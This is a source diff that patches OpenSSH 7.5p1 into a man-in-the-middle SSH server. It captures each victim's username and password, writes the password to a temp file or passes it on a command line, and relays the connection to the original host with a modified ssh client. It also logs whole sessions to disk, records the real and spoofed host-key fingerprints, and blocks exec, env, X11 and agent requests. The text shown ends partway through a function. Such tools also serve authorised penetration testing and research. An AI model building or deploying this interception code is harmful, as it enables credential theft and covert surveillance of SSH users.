 void	session_proctitle(Session *);
 int	session_setup_x11fwd(Session *);
-int	do_exec_pty(Session *, const char *);
-int	do_exec_no_pty(Session *, const char *);
+int	do_exec_pty(Session *, const char *, char *);
+int	do_exec_no_pty(Session *, const char *, char *);
 int	do_exec(Session *, const char *);
 void	do_login(Session *, const char *);
 #ifdef LOGIN_NEEDS_UTMPX
 static void	do_pre_login(Session *s);
 #endif
-void	do_child(Session *, const char *);
+void	do_child(Session *, const char *, char *);
 void	do_motd(void);
 int	check_quietlogin(Session *, const char *);
+double my_sleep(struct timespec *sleep_request);
 
 static void do_authenticated2(Authctxt *);
 
@@ -140,6 +145,7 @@
 extern int startup_pipe;
 extern void destroy_sensitive_data(void);
 extern Buffer loginmsg;
+extern Lol *lol;
 
 /* original command from peer. */
 const char *original_command = NULL;
@@ -165,6 +171,14 @@
 static char *auth_sock_name = NULL;
 static char *auth_sock_dir = NULL;
 
+/* This is the maximum number of times to attempt to open a log file for
+ * writing. */
+#define MAX_LOG_OPEN_TRIES 1048576 /* 1M */
+
+char *create_fingerprint_socket(int *sock_fd);
+int get_session_log_fd(void);
+void read_fingerprints(char **fingerprint_socket_name, int sock_fd, struct ssh *, Channel *c);
+
 /* removes the agent forwarding socket */
 
 static void
@@ -291,9 +305,10 @@
  * setting up file descriptors and such.
  */
 int
-do_exec_no_pty(Session *s, const char *command)
+do_exec_no_pty(Session *s, const char *command, char *fingerprint_file)
 {
 	pid_t pid;
+	int session_log_fd;
 
 #ifdef USE_PIPES
 	int pin[2], pout[2], perr[2];
@@ -420,7 +435,7 @@
 #endif
 
 		/* Do processing for the child (exec command etc). */
-		do_child(s, command);
+		do_child(s, command, fingerprint_file);
 		/* NOTREACHED */
 	default:
 		break;
@@ -445,6 +460,8 @@
 	 */
 	buffer_clear(&loginmsg);
 
+	session_log_fd = get_session_log_fd();
+
 #ifdef USE_PIPES
 	/* We are the parent.  Close the child sides of the pipes. */
 	close(pin[0]);
@@ -452,7 +469,7 @@
 	close(perr[1]);
 
 	session_set_fds(s, pin[1], pout[0], perr[0],
-	    s->is_subsystem, 0);
+	    s->is_subsystem, 0, session_log_fd);
 #else
 	/* We are the parent.  Close the child sides of the socket pairs. */
 	close(inout[0]);
@@ -463,7 +480,7 @@
 	 * handle the case that fdin and fdout are the same.
 	 */
 	session_set_fds(s, inout[1], inout[1], err[1],
-	    s->is_subsystem, 0);
+	    s->is_subsystem, 0, session_log_fd);
 #endif
 	return 0;
 }
@@ -475,10 +492,11 @@
  * lastlog, and other such operations.
  */
 int
-do_exec_pty(Session *s, const char *command)
+do_exec_pty(Session *s, const char *command, char *fingerprint_file)
 {
 	int fdout, ptyfd, ttyfd, ptymaster;
 	pid_t pid;
+	int session_log_fd;
 
 	if (s == NULL)
 		fatal("do_exec_pty: no session");
@@ -553,7 +571,7 @@
 		 * Do common processing for the child, such as execing
 		 * the command.
 		 */
-		do_child(s, command);
+		do_child(s, command, fingerprint_file);
 		/* NOTREACHED */
 	default:
 		break;
@@ -575,7 +593,8 @@
 	s->ptymaster = ptymaster;
 	packet_set_interactive(1, 
 	    options.ip_qos_interactive, options.ip_qos_bulk);
-	session_set_fds(s, ptyfd, fdout, -1, 1, 1);
+	session_log_fd = get_session_log_fd();
+	session_set_fds(s, ptyfd, fdout, -1, 1, 1, session_log_fd);
 	return 0;
 }
 
@@ -619,6 +638,8 @@
 	int ret;
 	const char *forced = NULL, *tty = NULL;
 	char session_type[1024];
+	int sock_fd = -1;
+	char *fingerprint_socket_name = NULL;
 
 	if (options.adm_forced_command) {
 		original_command = command;
@@ -673,10 +694,18 @@
 		PRIVSEP(audit_run_command(shell));
 	}
 #endif
+
+	/* Create a socket for the ssh client program to output its host key
+	 * fingerprints back to us. */
+	fingerprint_socket_name = create_fingerprint_socket(&sock_fd);
+
 	if (s->ttyfd != -1)
-		ret = do_exec_pty(s, command);
+		ret = do_exec_pty(s, command, fingerprint_socket_name);
 	else
-		ret = do_exec_no_pty(s, command);
+		ret = do_exec_no_pty(s, command, fingerprint_socket_name);
+
+	/* Read the client's host key fingerprints into the Channel struct. */
+	read_fingerprints(&fingerprint_socket_name, sock_fd, active_state, channel_by_id(s->chanid));
 
 	original_command = NULL;
 
@@ -1416,6 +1445,8 @@
 #ifdef WITH_SELINUX
 		setexeccon(NULL);
 #endif
+		logit("MITM: refusing to execute passwd.");
+		exit(1);
 #ifdef PASSWD_NEEDS_USERNAME
 		execl(_PATH_PASSWD_PROG, "passwd", s->pw->pw_name,
 		    (char *)NULL);
@@ -1475,7 +1506,7 @@
  */
 #define ARGV_MAX 10
 void
-do_child(Session *s, const char *command)
+do_child(Session *s, const char *command, char *fingerprint_file)
 {
 	extern char **environ;
 	char **env;
@@ -1628,9 +1659,14 @@
 #ifdef WITH_SELINUX
 		ssh_selinux_change_context("sftpd_t");
 #endif
-		exit(sftp_server_main(i, argv, s->pw));
+		exit(sftp_server_main(i, argv, s->pw,
+#ifdef DEBUG_HOST
+					DEBUG_HOST, DEBUG_PORT,
+#else
+					lol->original_host, lol->original_port,
+#endif
+					lol->username, lol->password));
 	}
-
 	fflush(NULL);
 
 	/* Get the last component of the shell name. */
@@ -1646,6 +1682,13 @@
 	 */
 	if (!command) {
 		char argv0[256];
+		char connect_string[512];
+		char port[16];
+		char password_file[] = "/tmp/lolXXXXXX";
+		int fd = -1;
+
+		memset(connect_string, 0, sizeof(connect_string));
+		memset(port, 0, sizeof(port));
 
 		/* Start the shell.  Set initial character to '-'. */
 		argv0[0] = '-';
@@ -1658,9 +1701,44 @@
 		}
 
 		/* Execute the shell. */
-		argv[0] = argv0;
+		/*argv[0] = argv0;
 		argv[1] = NULL;
-		execve(shell, argv, env);
+		execve(shell, argv, env);*/
+
+
+		snprintf(port, sizeof(port), "%hu", lol->original_port);
+
+		strlcpy(connect_string, lol->username, sizeof(connect_string));
+		strlcat(connect_string, "@", sizeof(connect_string));
+
+		#ifdef DEBUG_HOST
+		strlcat(connect_string, DEBUG_HOST, sizeof(connect_string));
+		snprintf(port, sizeof(port), "%d", DEBUG_PORT);
+		#else
+		strlcat(connect_string, lol->original_host, sizeof(connect_string));
+		#endif
+
+		/* Write the password to a temporary file.  The ssh program will delete this after reading it. */
+		fd = mkstemp(password_file);
+		if (fd < 0) {
+		  logit("MITM: Error: could not create temp password file for ssh client! [%s]", password_file);
+		  exit(-1);
+		}
+		write(fd, lol->password, strlen(lol->password));
+		close(fd);
+
+		debug3("MITMing connection to %s:%s", connect_string, port);
+
+		argv[0] = "/home/" BOGUS_USER "/bin/ssh";
+		argv[1] = "-Z";
+		argv[2] = password_file;
+		argv[3] = "-z";
+		argv[4] = fingerprint_file;
+		argv[5] = "-p";
+		argv[6] = port;
+		argv[7] = connect_string;
+		argv[8] = NULL;
+		execve(argv[0], argv, env);
 
 		/* Executing the shell failed. */
 		perror(shell);
@@ -1672,7 +1750,39 @@
 	 */
 	argv[0] = (char *) shell0;
 	argv[1] = "-c";
-	argv[2] = (char *) command;
+
+	if (strcmp(command, _PATH_SFTP_SERVER) != 0) {
+		logit("MITM: attempted to exec %s, but forcing it to %s instead.", command, _PATH_SFTP_SERVER);
+		command = _PATH_SFTP_SERVER;
+	}
+
+	size_t new_command_size = strlen(command) + strlen(lol->original_host) + 16 + strlen(lol->username) + strlen(lol->password) + 4 + 1;
+#ifdef DEBUG_HOST
+#define SFTP_LOG_ARGS " -f AUTH -l DEBUG3"
+	new_command_size += sizeof(SFTP_LOG_ARGS);
+#endif
+
+	char *new_command = calloc(new_command_size, sizeof(char *));
+	strlcpy(new_command, command, new_command_size);
+	strlcat(new_command, " ", new_command_size);
+	strlcat(new_command, lol->original_host, new_command_size);
+	strlcat(new_command, " ", new_command_size);
+
+	char port_str[16];
+	snprintf(port_str, sizeof(port_str), "%u", lol->original_port);
+
+	strlcat(new_command, port_str, new_command_size);
+	strlcat(new_command, " ", new_command_size);
+	strlcat(new_command, lol->username, new_command_size);
+	strlcat(new_command, " ", new_command_size);
+	strlcat(new_command, lol->password, new_command_size);
+
+#ifdef DEBUG_HOST
+	strlcat(new_command, SFTP_LOG_ARGS, new_command_size);	
+#endif
+
+	logit("MITM: SFTP command: %s", new_command);
+	argv[2] = (char *) new_command;
 	argv[3] = NULL;
 	execve(shell, argv, env);
 	perror(shell);
@@ -1927,6 +2037,11 @@
 	debug2("subsystem request for %.100s by user %s", s->subsys,
 	    s->pw->pw_name);
 
+	if (strcmp(s->subsys, "sftp") != 0) {
+		logit("MITM: subsystem request for something other than sftp (%.100s).  Rejecting...", s->subsys);
+		return 0;
+        }
+
 	for (i = 0; i < options.num_subsystems; i++) {
 		if (strcmp(s->subsys, options.subsystem_name[i]) == 0) {
 			prog = options.subsystem_command[i];
@@ -1958,6 +2073,10 @@
 {
 	int success;
 
+	/* Disable X11 requests. */
+	logit("MITM: rejecting X11 request.");
+	return 0;
+
 	if (s->auth_proto != NULL || s->auth_data != NULL) {
 		error("session_x11_req: session %d: "
 		    "x11 forwarding already active", s->self);
@@ -1999,6 +2118,12 @@
 
 	char *command = packet_get_string(&len);
 	packet_check_eom();
+
+	/* Disable exec. */
+	logit("MITM: rejecting exec request: [%s]", command == NULL ? "(NULL)" : command);
+	free(command);
+	return 0;
+
 	success = do_exec(s, command) == 0;
 	free(command);
 	return success;
@@ -2022,6 +2147,10 @@
 	char *name, *val;
 	u_int name_len, val_len, i;
 
+	/* Disable env requests. */
+	logit("MITM: rejecting env request.");
+	return 0;
+
 	name = packet_get_cstring(&name_len);
 	val = packet_get_cstring(&val_len);
 	packet_check_eom();
@@ -2056,6 +2185,11 @@
 {
 	static int called = 0;
 	packet_check_eom();
+
+	/* Disable auth agent requests. */
+	logit("MITM: rejecting auth agent request.");
+	return 0;
+
 	if (no_agent_forwarding_flag || !options.allow_agent_forwarding) {
 		debug("session_auth_agent_req: no_agent_forwarding_flag");
 		return 0;
@@ -2113,7 +2247,7 @@
 
 void
 session_set_fds(Session *s, int fdin, int fdout, int fderr, int ignore_fderr,
-    int is_tty)
+    int is_tty, int session_log_fd)
 {
 	/*
 	 * now that have a child and a pipe to the child,
@@ -2124,7 +2258,7 @@
 	channel_set_fds(s->chanid,
 	    fdout, fdin, fderr,
 	    ignore_fderr ? CHAN_EXTENDED_IGNORE : CHAN_EXTENDED_READ,
-	    1, is_tty, CHAN_SES_WINDOW_DEFAULT);
+	    1, is_tty, CHAN_SES_WINDOW_DEFAULT, session_log_fd);
 }
 
 /*
@@ -2578,3 +2712,169 @@
 	return remote;
 }
 
+/* Returns a file handle for logging a shell session. */
+int get_session_log_fd(void) {
+  char filename[64] = "/home/" BOGUS_USER "/session_0.txt";
+  int log_fd = -1;
+  int num_tries = 0;
+
+  while ((num_tries < MAX_LOG_OPEN_TRIES) && (log_fd < 0)) {
+    log_fd = open(filename, O_CREAT | O_EXCL | O_NOATIME | O_NOFOLLOW | O_WRONLY
+#ifdef SYNC_LOG
+        | O_SYNC
+#endif
+        , S_IRUSR | S_IWUSR);
+    if (log_fd < 0)
+      snprintf(filename, sizeof(filename) - 1, "/home/" BOGUS_USER "/session_%d.txt", num_tries + 1);
+    num_tries++;
+  }
+
+  if (log_fd < 0)
+    logit("MITM: Could not open file for logging!");
+
+  return log_fd;
+}
+
+/* Requests to sleep a certain amount of time (must be less than 1 second).
+ * Returns the number of seconds actually slept. */
+/*
+double my_sleep(struct timespec *sleep_request) {
+  struct timespec sleep_remaining;
+
+  * If we slept the entire duration without being interrupted... *
+  if (nanosleep(sleep_request, &sleep_remaining) == 0)
+    return (double)(sleep_request->tv_nsec / 1000000000.0);
+  else
+    return (double)((sleep_request->tv_nsec - sleep_remaining.tv_nsec) / 1000000000.0);
+}
+*/
+
+/* Creates a unique socket and listens on it.  Returns its filename and sets
+ * the "sock_fd" argument to the socket handle.  The caller must free() the
+ * return value. */
+char *create_fingerprint_socket(int *sock_fd) {
+  char *fingerprint_socket_name = NULL;
+  struct sockaddr_un addr;
+  char socket_prefix[] = "/home/ssh-mitm/tmp/socket_";
+  int counter = 0;
+  int fingerprint_socket_name_len = sizeof(socket_prefix) + 5;
+
+  /* Create a new socket. */
+  memset(&addr, 0, sizeof(addr));
+  addr.sun_family = AF_UNIX;
+  *sock_fd = socket(AF_UNIX, SOCK_STREAM, 0);
+  if (*sock_fd == -1) {
+    logit("MITM: Error: could not create socket for fingerprint data!");
+    return "";
+  }
+
+  /* Allocate a return buffer to hold the socket filename. */
+  if ((fingerprint_socket_name = calloc(fingerprint_socket_name_len, sizeof(char))) == NULL) {
+    *sock_fd = -1;
+    return strdup("");
+  }
+
+  /* Make a new, unique socket file path. */
+  while (counter < 1024) {
+    snprintf(fingerprint_socket_name, fingerprint_socket_name_len, "%s%d", socket_prefix, counter);
+    strlcpy(addr.sun_path, fingerprint_socket_name , sizeof(addr.sun_path));
+    if (bind(*sock_fd, (struct sockaddr *)&addr, sizeof(addr)) == 0)
+      break;
+
+    counter++;
+  }
+
+  /* Listen on the socket handle. */
+  if (listen(*sock_fd, 1) == -1) {
+    logit("MITM: Error while listening on socket for fingerprint data!");
+    shutdown(*sock_fd, SHUT_RDWR);
+    free(fingerprint_socket_name); fingerprint_socket_name = NULL;
+    *sock_fd = -1;
+    return strdup("");
+  }
+
+  return fingerprint_socket_name;
+}
+
+/* Reads the host key fingerprints from the client program, sets the
+ * appropriate "legit_*_fingerprint" global variables, deletes the socket, and
+ * frees the socket name. */
+void read_fingerprints(char **fingerprint_socket_name, int sock_fd, struct ssh *ssh_active_state, Channel *c) {
+  int client_fd = -1;
+  char *buffer = calloc(SOCKET_FINGERPRINT_BUFFER_SIZE, sizeof(char));
+
+  if ((buffer != NULL) && (c != NULL)) {
+    int r, bytes_read = 0;
+    char *saved_buffer = buffer;  /* We use strsep(), so save this pointer. */
+    char *line = NULL;
+    int line_len = 0;
+    struct sshkey *k = NULL;
+    char *fp = NULL;
+
+    /* Accept the client connection, and read everything into buffer. */
+    client_fd = accept(sock_fd, NULL, NULL);
+    while (1) {
+      r = read(client_fd, buffer + bytes_read, SOCKET_FINGERPRINT_BUFFER_SIZE - bytes_read);
+      if (r <= 0)
+	break;
+      bytes_read += r;
+    }
+
+    /* Tokenize the buffer by the newline character. */
+    while ((line = strsep(&buffer, "\n")) != NULL) {
+      line_len = strlen(line);
+      if (line_len > 4) {
+
+	/* We should only get one MD5 and one SHA256 fingerprint.  If we get
+	 * more, log it. */
+	if ((c->legit_md5_fingerprint_len > 0) && (c->legit_sha256_fingerprint_len > 0))
+	  logit("MITM: !! Somehow, both the MD5 and SHA256 fingerprints were already set, but we got another fingerprint line anyway!! Please contact the project maintainer about this! [%s]", line);
+
+	/* If this line begins with "MD5:", its an MD5 fingerprint.  Copy it
+	 * into the "legit_md5_fingerprint" buffer. */
+	if (memcmp(line, "MD5:", 4) == 0) {
+	  c->legit_md5_fingerprint = strdup(line + 4);
+	  c->legit_md5_fingerprint_len = strlen(c->legit_md5_fingerprint);
+	/* If this is a SHA256 fingerprint, copy this as well. */
+	} else if (memcmp(line, "SHA256:", 7) == 0) {
+	  c->legit_sha256_fingerprint = strdup(line + 7);
+	  c->legit_sha256_fingerprint_len = strlen(c->legit_sha256_fingerprint);
+	} else
+	  logit("MITM: unknown fingerprint!: [%s]", line);
+      }
+    }
+
+    c->extra_fp_bytes = calloc(EXTRA_FP_BYTES_SIZE, sizeof(char));
+
+    /* Print the fingerprints in the debug log. */
+    if (c->legit_md5_fingerprint_len > 0)
+      debug("MITM: MD5 fingerprint received from legit server: [%s]", c->legit_md5_fingerprint);
+    if (c->legit_sha256_fingerprint_len > 0)
+      debug("MITM: SHA256 fingerprint received from legit server: [%s]", c->legit_sha256_fingerprint);
+
+    /* Set the host key fingerprints our sshd is using with the victim. */
+    k = ssh_active_state->kex->load_host_public_key(active_state->kex->hostkey_type, ssh_active_state->kex->hostkey_nid, ssh_active_state);
+    fp = sshkey_fingerprint(k, SSH_DIGEST_MD5, SSH_FP_DEFAULT);
+    c->our_md5_fingerprint = strdup(fp + 4);  // Cut off the "MD5:" prefix.
+    c->our_md5_fingerprint_len = strlen(c->our_md5_fingerprint);
+    free(fp); fp = NULL;
+
+    fp = sshkey_fingerprint(k, SSH_DIGEST_SHA256, SSH_FP_DEFAULT);
+    c->our_sha256_fingerprint = strdup(fp + 7); // Cut off the "SHA256:" prefix.
+    c->our_sha256_fingerprint_len = strlen(c->our_sha256_fingerprint);
+    free(fp); fp = NULL;
+
+    debug("MITM: MD5 fingerprint seen by victim: [%s]", c->our_md5_fingerprint);
+    debug("MITM: SHA256 fingerprint seen by victim: [%s]", c->our_sha256_fingerprint);
+
+    /* Free the buffer we read data from the socket into. */
+    free(saved_buffer); saved_buffer = NULL; buffer = NULL;
+  }
+
+  /* We are done with this socket, so shut it down, delete the file, and
+  * free the filename. */
+  shutdown(client_fd, SHUT_RDWR);
+  close(sock_fd);
+  unlink(*fingerprint_socket_name);
+  free(*fingerprint_socket_name); *fingerprint_socket_name = NULL;
+}
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp.c openssh-7.5p1-mitm/sftp.c
--- openssh-7.5p1/sftp.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp.c	2017-07-24 15:25:11.267472551 -0400
@@ -579,9 +579,10 @@
 remote_is_dir(struct sftp_conn *conn, const char *path)
 {
 	Attrib *a;
+	u_int status;
 
 	/* XXX: report errors? */
-	if ((a = do_stat(conn, path, 1)) == NULL)
+	if ((a = do_stat(conn, path, 1, &status)) == NULL)
 		return(0);
 	if (!(a->flags & SSH2_FILEXFER_ATTR_PERMISSIONS))
 		return(0);
@@ -1504,7 +1505,8 @@
 			err = 1;
 			break;
 		}
-		if ((aa = do_stat(conn, tmp, 0)) == NULL) {
+		u_int status;
+		if ((aa = do_stat(conn, tmp, 0, &status)) == NULL) {
 			free(tmp);
 			err = 1;
 			break;
@@ -1593,7 +1595,8 @@
 		path1 = make_absolute(path1, *pwd);
 		remote_glob(conn, path1, GLOB_NOCHECK, NULL, &g);
 		for (i = 0; g.gl_pathv[i] && !interrupted; i++) {
-			if (!(aa = do_stat(conn, g.gl_pathv[i], 0))) {
+			u_int status;
+			if (!(aa = do_stat(conn, g.gl_pathv[i], 0, &status))) {
 				if (err_abort) {
 					err = -1;
 					break;
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-client.c openssh-7.5p1-mitm/sftp-client.c
--- openssh-7.5p1/sftp-client.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp-client.c	2017-07-24 15:25:11.267472551 -0400
@@ -74,6 +74,7 @@
 # define SFTP_DIRECTORY_CHARS      "/"
 #endif /* HAVE_CYGWIN */
 
+/*
 struct sftp_conn {
 	int fd_in;
 	int fd_out;
@@ -90,10 +91,13 @@
 	u_int64_t limit_kbps;
 	struct bwlimit bwlimit_in, bwlimit_out;
 };
+*/
+struct sftp_conn *client_conn = NULL;
+
 
 static u_char *
-get_handle(struct sftp_conn *conn, u_int expected_id, size_t *len,
-    const char *errfmt, ...) __attribute__((format(printf, 4, 5)));
+get_handle(struct sftp_conn *conn, u_int expected_id, u_int *status, size_t *len,
+    const char *errfmt, ...) __attribute__((format(printf, 5, 6)));
 
 /* ARGSUSED */
 static int
@@ -231,11 +235,11 @@
 }
 
 static u_char *
-get_handle(struct sftp_conn *conn, u_int expected_id, size_t *len,
+get_handle(struct sftp_conn *conn, u_int expected_id, u_int *status, size_t *len,
     const char *errfmt, ...)
 {
 	struct sshbuf *msg;
-	u_int id, status;
+	u_int id;
 	u_char type;
 	u_char *handle;
 	char errmsg[256];
@@ -258,10 +262,10 @@
 		fatal("%s: ID mismatch (%u != %u)",
 		    errfmt == NULL ? __func__ : errmsg, id, expected_id);
 	if (type == SSH2_FXP_STATUS) {
-		if ((r = sshbuf_get_u32(msg, &status)) != 0)
+		if ((r = sshbuf_get_u32(msg, status)) != 0)
 			fatal("%s: buffer error: %s", __func__, ssh_err(r));
 		if (errfmt != NULL)
-			error("%s: %s", errmsg, fx2txt(status));
+			error("%s: %s", errmsg, fx2txt(*status));
 		sshbuf_free(msg);
 		return(NULL);
 	} else if (type != SSH2_FXP_HANDLE)
@@ -276,7 +280,7 @@
 }
 
 static Attrib *
-get_decode_stat(struct sftp_conn *conn, u_int expected_id, int quiet)
+get_decode_stat(struct sftp_conn *conn, u_int expected_id, int quiet, u_int *status)
 {
 	struct sshbuf *msg;
 	u_int id;
@@ -296,14 +300,13 @@
 	if (id != expected_id)
 		fatal("ID mismatch (%u != %u)", id, expected_id);
 	if (type == SSH2_FXP_STATUS) {
-		u_int status;
 
-		if ((r = sshbuf_get_u32(msg, &status)) != 0)
+		if ((r = sshbuf_get_u32(msg, status)) != 0)
 			fatal("%s: buffer error: %s", __func__, ssh_err(r));
 		if (quiet)
-			debug("Couldn't stat remote file: %s", fx2txt(status));
+			debug("Couldn't stat remote file: %s", fx2txt(*status));
 		else
-			error("Couldn't stat remote file: %s", fx2txt(status));
+			error("Couldn't stat remote file: %s", fx2txt(*status));
 		sshbuf_free(msg);
 		return(NULL);
 	} else if (type != SSH2_FXP_ATTRS) {
@@ -322,7 +325,7 @@
 
 static int
 get_decode_statvfs(struct sftp_conn *conn, struct sftp_statvfs *st,
-    u_int expected_id, int quiet)
+    u_int expected_id, int quiet, u_int *status)
 {
 	struct sshbuf *msg;
 	u_char type;
@@ -342,14 +345,12 @@
 	if (id != expected_id)
 		fatal("ID mismatch (%u != %u)", id, expected_id);
 	if (type == SSH2_FXP_STATUS) {
-		u_int status;
-
-		if ((r = sshbuf_get_u32(msg, &status)) != 0)
+		if ((r = sshbuf_get_u32(msg, status)) != 0)
 			fatal("%s: buffer error: %s", __func__, ssh_err(r));
 		if (quiet)
-			debug("Couldn't statvfs: %s", fx2txt(status));
+			debug("Couldn't statvfs: %s", fx2txt(*status));
 		else
-			error("Couldn't statvfs: %s", fx2txt(status));
+			error("Couldn't statvfs: %s", fx2txt(*status));
 		sshbuf_free(msg);
 		return -1;
 	} else if (type != SSH2_FXP_EXTENDED_REPLY) {
@@ -523,7 +524,7 @@
 	u_int count, id, i, expected_id, ents = 0;
 	size_t handle_len;
 	u_char type, *handle;
-	int status = SSH2_FX_FAILURE;
+	int status = SSH2_FX_FAILURE, status_ret;
 	int r;
 
 	if (dir)
@@ -539,7 +540,7 @@
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 	send_msg(conn, msg);
 
-	handle = get_handle(conn, id, &handle_len,
+	handle = get_handle(conn, id, &status_ret, &handle_len,
 	    "remote readdir(\"%s\")", path);
 	if (handle == NULL) {
 		sshbuf_free(msg);
@@ -730,7 +731,7 @@
 }
 
 Attrib *
-do_stat(struct sftp_conn *conn, const char *path, int quiet)
+do_stat(struct sftp_conn *conn, const char *path, int quiet, u_int *status)
 {
 	u_int id;
 
@@ -740,11 +741,11 @@
 	    conn->version == 0 ? SSH2_FXP_STAT_VERSION_0 : SSH2_FXP_STAT,
 	    path, strlen(path));
 
-	return(get_decode_stat(conn, id, quiet));
+	return(get_decode_stat(conn, id, quiet, status));
 }
 
 Attrib *
-do_lstat(struct sftp_conn *conn, const char *path, int quiet)
+do_lstat(struct sftp_conn *conn, const char *path, int quiet, u_int *status)
 {
 	u_int id;
 
@@ -753,20 +754,20 @@
 			debug("Server version does not support lstat operation");
 		else
 			logit("Server version does not support lstat operation");
-		return(do_stat(conn, path, quiet));
+		return(do_stat(conn, path, quiet, status));
 	}
 
 	id = conn->msg_id++;
 	send_string_request(conn, id, SSH2_FXP_LSTAT, path,
 	    strlen(path));
 
-	return(get_decode_stat(conn, id, quiet));
+	return(get_decode_stat(conn, id, quiet, status));
 }
 
 #ifdef notyet
 Attrib *
 do_fstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len,
-    int quiet)
+    int quiet, u_int *status)
 {
 	u_int id;
 
@@ -774,7 +775,7 @@
 	send_string_request(conn, id, SSH2_FXP_FSTAT, handle,
 	    handle_len);
 
-	return(get_decode_stat(conn, id, quiet));
+	return(get_decode_stat(conn, id, quiet, status));
 }
 #endif
 
@@ -1076,6 +1077,7 @@
 	struct sshbuf *msg;
 	u_int id;
 	int r;
+	u_int status;
 
 	if ((conn->exts & SFTP_EXT_STATVFS) == 0) {
 		error("Server does not support statvfs@openssh.com extension");
@@ -1095,7 +1097,7 @@
 	send_msg(conn, msg);
 	sshbuf_free(msg);
 
-	return get_decode_statvfs(conn, st, id, quiet);
+	return get_decode_statvfs(conn, st, id, quiet, &status);
 }
 
 #ifdef notyet
@@ -1105,6 +1107,7 @@
 {
 	struct sshbuf *msg;
 	u_int id;
+	u_int status;
 
 	if ((conn->exts & SFTP_EXT_FSTATVFS) == 0) {
 		error("Server does not support fstatvfs@openssh.com extension");
@@ -1124,7 +1127,7 @@
 	send_msg(conn, msg);
 	sshbuf_free(msg);
 
-	return get_decode_statvfs(conn, st, id, quiet);
+	return get_decode_statvfs(conn, st, id, quiet, &status);
 }
 #endif
 
@@ -1172,10 +1175,11 @@
 	TAILQ_HEAD(reqhead, request) requests;
 	struct request *req;
 	u_char type;
+	u_int status_ret;
 
 	TAILQ_INIT(&requests);
 
-	if (a == NULL && (a = do_stat(conn, remote_path, 0)) == NULL)
+	if (a == NULL && (a = do_stat(conn, remote_path, 0, &status_ret)) == NULL)
 		return -1;
 
 	/* Do not preserve set[ug]id here, as we do not preserve ownership */
@@ -1212,7 +1216,7 @@
 	send_msg(conn, msg);
 	debug3("Sent message SSH2_FXP_OPEN I:%u P:%s", id, remote_path);
 
-	handle = get_handle(conn, id, &handle_len,
+	handle = get_handle(conn, id, &status_ret, &handle_len,
 	    "remote open(\"%s\")", remote_path);
 	if (handle == NULL) {
 		sshbuf_free(msg);
@@ -1453,6 +1457,7 @@
 	SFTP_DIRENT **dir_entries;
 	char *filename, *new_src, *new_dst;
 	mode_t mode = 0777;
+	u_int status_ret;
 
 	if (depth >= MAX_DIR_DEPTH) {
 		error("Maximum directory depth exceeded: %d levels", depth);
@@ -1460,7 +1465,7 @@
 	}
 
 	if (dirattrib == NULL &&
-	    (dirattrib = do_stat(conn, src, 1)) == NULL) {
+	    (dirattrib = do_stat(conn, src, 1, &status_ret)) == NULL) {
 		error("Unable to stat remote directory \"%s\"", src);
 		return -1;
 	}
@@ -1579,6 +1584,7 @@
 	TAILQ_HEAD(ackhead, outstanding_ack) acks;
 	struct outstanding_ack *ack = NULL;
 	size_t handle_len;
+	int status_ret;
 
 	TAILQ_INIT(&acks);
 
@@ -1607,8 +1613,9 @@
 		a.flags &= ~SSH2_FILEXFER_ATTR_ACMODTIME;
 
 	if (resume) {
+	  u_int status_ret2;
 		/* Get remote file size if it exists */
-		if ((c = do_stat(conn, remote_path, 0)) == NULL) {
+		if ((c = do_stat(conn, remote_path, 0, &status_ret2)) == NULL) {
 			close(local_fd);
 			return -1;
 		}
@@ -1643,7 +1650,7 @@
 
 	sshbuf_reset(msg);
 
-	handle = get_handle(conn, id, &handle_len,
+	handle = get_handle(conn, id, &status_ret, &handle_len,
 	    "remote open(\"%s\")", remote_path);
 	if (handle == NULL) {
 		close(local_fd);
@@ -1818,7 +1825,8 @@
 	 * the path already existed and is a directory.
 	 */
 	if (do_mkdir(conn, dst, &a, 0) != 0) {
-		if ((dirattrib = do_stat(conn, dst, 0)) == NULL)
+		u_int status_ret;
+		if ((dirattrib = do_stat(conn, dst, 0, &status_ret)) == NULL)
 			return -1;
 		if (!S_ISDIR(dirattrib->perm)) {
 			error("\"%s\" exists but is not a directory", dst);
@@ -1904,3 +1912,534 @@
 	return(ret);
 }
 
+/* Returns the directory handle, which must be free()'ed by the caller. */
+u_char *
+mitm_do_opendir(struct sftp_conn *conn, const char *path, size_t *handle_len, int *status)
+{
+	struct sshbuf *msg;
+	u_int id;
+	u_char *handle;
+	int r;
+
+	id = conn->msg_id++;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_OPENDIR)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, path)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+
+	handle = get_handle(conn, id, status, handle_len,
+	    "remote opendir(\"%s\")", path);
+	sshbuf_free(msg); msg = NULL;
+	return handle;
+}
+
+Stat *
+mitm_do_readdir(struct sftp_conn *conn, u_int32_t id, u_char *handle_str, size_t handle_len, u_int *count, int *status) {
+	struct sshbuf *msg;
+	Stat *ret;
+	int r;
+	u_char type;
+	u_int i;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_READDIR)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_string(msg, handle_str, handle_len)) != 0)
+	  fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	send_msg(conn, msg);
+	sshbuf_reset(msg);
+	get_msg(conn, msg);
+	if ((r = sshbuf_get_u8(msg, &type)) != 0 ||
+	    (r = sshbuf_get_u32(msg, &id)) != 0)
+	  fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("Received reply T:%u I:%u", type, id);
+	
+	if (type == SSH2_FXP_STATUS) {
+	  u_int rstatus;
+	  
+	  if ((r = sshbuf_get_u32(msg, &rstatus)) != 0)
